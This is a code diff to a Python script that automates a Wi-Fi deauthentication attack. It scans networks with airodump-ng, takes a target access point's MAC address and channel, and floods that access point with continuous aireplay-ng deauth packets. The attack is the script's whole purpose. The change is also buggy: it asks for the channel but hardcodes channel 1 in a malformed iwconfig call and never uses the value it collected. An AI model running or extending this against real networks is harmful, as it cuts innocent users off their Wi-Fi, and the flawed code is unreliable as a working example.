@@ -36,10 +36,13 @@ def select_target():
         subprocess.run(["airodump-ng", MONITOR_INTERFACE])
     except KeyboardInterrupt:
         pass
-    return input("Please enter the MAC address of the target wifi network: ")
+    mac_address =  input("Please enter the MAC address of the target wifi network: ")
+    channel = input("Please enter the channel number of the target wifi network: ")
+    return mac_address, channel
 
 def attack():
     try:
+        subprocess.run(["iwconfig", MONITOR_INTERFACE, "set", "channel", "1"])
         subprocess.run(["aireplay-ng", "--deauth", "0", "-a", selected_wifi_mac, MONITOR_INTERFACE])
     except KeyboardInterrupt:
         print("Stopping...")
@@ -48,5 +51,5 @@ def attack():
 #Run everything
 install_packages()
 monitor_mode_on()
-selected_wifi_mac = select_target()
+selected_wifi_mac, wifi_channel = select_target()
 attack()
